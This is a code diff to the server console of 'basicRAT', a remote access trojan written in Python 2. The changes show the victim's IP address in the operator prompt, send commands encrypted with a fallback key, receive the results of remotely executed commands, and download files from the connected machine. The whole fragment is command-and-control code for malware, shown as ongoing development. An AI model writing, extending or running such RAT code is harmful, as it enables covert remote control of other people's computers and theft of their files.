@@ -46,10 +46,10 @@ def main():
     print 'basicRAT server listening on port {}...\n'.format(PORT)
 
     s.listen(10)
-    conn, _ = s.accept()
+    conn, addr = s.accept()
 
     while True:
-        prompt = raw_input('basicRAT> ').rstrip().split()
+        prompt = raw_input('[{0}] basicRAT> '.format(addr[0])).rstrip().split()
 
         # allow noop
         if prompt == []:
@@ -69,7 +69,7 @@ def main():
 
         # send data to client
         data = '{} {}'.format(cmd, action).rstrip()
-        conn.send(encrypt(data))
+        conn.send(encrypt(data, FALLBACK_KEY))
 
         # stop server
         if cmd == 'quit':
@@ -79,7 +79,7 @@ def main():
         # results of command
         elif cmd == 'run':
             recv_data = conn.recv(4096)
-            print decrypt(recv_data)
+            print decrypt(recv_data, FALLBACK_KEY)
 
         # download a file
         elif cmd == 'download':
@@ -90,7 +90,11 @@ def main():
                     recv_data = conn.recv(1024)
                     if not recv_data:
                         break
-                    f.write(decrypt(recv_data))
+                    f.write(decrypt(recv_data, FALLBACK_KEY))
+                    
+        else:
+            print "Invalid command"
+            print "Type 'help' to get a list of all commands"
 
 
 if __name__ == '__main__':
